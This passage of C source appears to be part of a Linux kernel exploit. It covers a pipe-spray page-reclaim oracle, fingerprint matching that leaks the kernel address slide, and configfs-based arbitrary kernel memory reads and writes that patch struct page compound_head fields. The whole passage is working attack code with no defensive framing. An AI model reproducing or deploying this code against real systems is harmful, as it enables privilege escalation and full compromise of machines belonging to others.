    size_t gate_offset = PAGE_SIZE;
    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
      if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
        gate_offset = offset;
        break;
      }
    }
    if (gate_offset != PAGE_SIZE) {
      gate_hits++;
      gate_pipe_index = (int)pipe_index;
      pr_info("p0 gate marker pipe=%zu offset=%zu\n",
              pipe_index, gate_offset);
    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
      changed_pages++;
      uint64_t words[8];
      memcpy(words, page, sizeof(words));
      pr_info("p0 gate changed pipe=%zu q0=%016llx q1=%016llx "
              "q2=%016llx q3=%016llx q4=%016llx q5=%016llx "
              "q6=%016llx q7=%016llx\n",
              pipe_index,
              (unsigned long long)words[0],
              (unsigned long long)words[1],
              (unsigned long long)words[2],
              (unsigned long long)words[3],
              (unsigned long long)words[4],
              (unsigned long long)words[5],
              (unsigned long long)words[6],
              (unsigned long long)words[7]);
    }
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
  }
  pr_info("p0 pipe gate hits=%d changed=%d\n",
          gate_hits, changed_pages);
  if (gate_hits != 0 || changed_pages != 0) {
    spawn_p0_ref_keeper(
        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
  }
  if (gate_hits == 1 && changed_pages == 0) {
    return 1;
  }
  if (gate_hits == 0 && changed_pages == 0) {
    return 0;
  }
  return -1;
}

static int p0_fingerprint_score(
    const unsigned char *page, const struct p0_fingerprint *fingerprint) {
  int score = 0;
  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
    uint64_t value = 0;
    memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
    if (value == fingerprint->words[index]) {
      score++;
    }
  }
  return score;
}

uintptr_t scan_p0_pipe_oracle(void) {
  unsigned char page[PAGE_SIZE];
  size_t scan_size =
      p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
  uintptr_t best_slide = (uintptr_t)-1;
  int best_score = -1;
  int second_score = -1;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        scan_size)) {
      pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                 pipe_index, scan_size, errno);
      return (uintptr_t)-1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }

    changed_pages++;
    uint64_t sampled_words[P0_FINGERPRINT_WORDS];
    for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
      memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
             sizeof(sampled_words[word]));
    }
    pr_info("p0 fingerprint sample "
            "w0=%016llx w1=%016llx w2=%016llx w3=%016llx "
            "w4=%016llx w5=%016llx w6=%016llx w7=%016llx\n",
            (unsigned long long)sampled_words[0],
            (unsigned long long)sampled_words[1],
            (unsigned long long)sampled_words[2],
            (unsigned long long)sampled_words[3],
            (unsigned long long)sampled_words[4],
            (unsigned long long)sampled_words[5],
            (unsigned long long)sampled_words[6],
            (unsigned long long)sampled_words[7]);
    for (size_t index = 0;
         index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
         index++) {
      int score = p0_fingerprint_score(page, &p0_fingerprints[index]);
      if (score > best_score) {
        second_score = best_score;
        best_score = score;
        best_slide = p0_fingerprints[index].slide;
      } else if (score > second_score) {
        second_score = score;
      }
    }
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d slide=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
  }

  pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
    return (uintptr_t)-1;
  }
  return best_slide;
}

int restore_p0_oracle_pages(int fd) {
  if (!p0_gate_page_struct && !p0_probe_page_struct) {
    return 1;
  }
  if (!p0_gate_page_struct || !p0_probe_page_struct) {
    return 0;
  }
  uintptr_t pages[] = {
    p0_gate_page_struct,
    p0_probe_page_struct,
  };
  uint64_t zero = 0;
  int restored = 1;

  for (size_t index = 0; index < sizeof(pages) / sizeof(pages[0]); index++) {
    uintptr_t compound_head = pages[index] + STRUCT_PAGE_COMPOUND_HEAD_OFF;
    uint64_t before = 0;
    uint64_t after = UINT64_MAX;
    ssize_t read_before = configfs_read_once(
        fd, compound_head, &before, sizeof(before));
    ssize_t write_ret = configfs_write_once(
        fd, compound_head, &zero, sizeof(zero));
    ssize_t read_after = configfs_read_once(
        fd, compound_head, &after, sizeof(after));
    pr_info("p0 restore page=%016zx read=%zd write=%zd verify=%zd "
            "before=%016llx after=%016llx\n",
            pages[index], read_before, write_ret, read_after,
            (unsigned long long)before, (unsigned long long)after);
    if (read_before != (ssize_t)sizeof(before) ||
        write_ret != (ssize_t)sizeof(zero) ||
        read_after != (ssize_t)sizeof(after) || after != 0) {
      restored = 0;
    }
  }
  return restored;
}
#endif
